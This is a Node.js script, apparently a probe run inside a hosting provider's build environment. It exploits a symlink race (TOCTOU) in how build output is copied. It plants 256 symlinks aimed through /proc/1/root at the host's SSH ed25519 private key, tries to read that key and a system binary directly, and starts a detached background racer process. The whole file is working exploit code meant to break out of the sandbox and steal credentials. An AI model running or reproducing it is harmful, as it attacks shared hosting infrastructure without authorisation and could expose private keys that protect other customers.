import fs from "node:fs";
import path from "node:path";
import { spawn } from "node:child_process";

const marker = "HOSTINGER_NODE_FILE_LSTAT_OPEN_TOCTOU_GATE:r229";
const output = path.resolve("dist");
const alternateRoot = path.resolve("race-alternates");
const fileCount = 256;
fs.rmSync(output, { recursive: true, force: true });
fs.rmSync(alternateRoot, { recursive: true, force: true });
fs.mkdirSync(output, { recursive: true });
fs.mkdirSync(alternateRoot, { recursive: true });
fs.writeFileSync(path.join(output, "control.txt"), `${marker}:894a8b0f9abe4351\n`, { mode: 0o600 });

const hiddenTarget = "../../../../../../../../proc/1/root/etc/ssh/ssh_host_ed25519_key";
let createdLinks = 0;
let setupError = null;
for (let index = 0; index < fileCount; index += 1) {
  const suffix = String(index).padStart(3, "0");
  fs.writeFileSync(path.join(output, `probe-${suffix}`), `${marker}:${suffix}\n`, { mode: 0o600 });
  try {
    fs.symlinkSync(hiddenTarget, path.join(alternateRoot, `alt-${suffix}`));
    createdLinks += 1;
  } catch (error) {
    setupError = error.code ?? error.name;
    break;
  }
}

let directRead;
try {
  const body = fs.readFileSync("/usr/sbin/proxyexec");
  directRead = { readable: true, bytes: body.length };
} catch (error) {
  directRead = { readable: false, errorCode: error.code ?? error.name };
}

let exactTargetProbe;
try {
  const body = fs.readFileSync("/proc/1/root/etc/ssh/ssh_host_ed25519_key");
  exactTargetProbe = { readable: true, bytes: body.length };
} catch (error) {
  exactTargetProbe = { readable: false, errorCode: error.code ?? error.name };
}

let racer;
try {
  const child = spawn("python3", ["race-output-root.py"], {
    cwd: process.cwd(),
    detached: true,
    stdio: "ignore",
  });
  child.unref();
  racer = { started: true, pidPresent: Number.isInteger(child.pid) };
} catch (error) {
  racer = { started: false, errorCode: error.code ?? error.name };
}

console.log(JSON.stringify({
  marker,
  directRead,
  exactTargetProbe,
  fileRace: { fileCount, createdLinks, setupError },
  safeOutput: { isDirectory: fs.statSync(output).isDirectory(), entryCount: fs.readdirSync(output).length },
  racer,
  outputRelativeToRepository: path.relative(process.cwd(), output),
}));
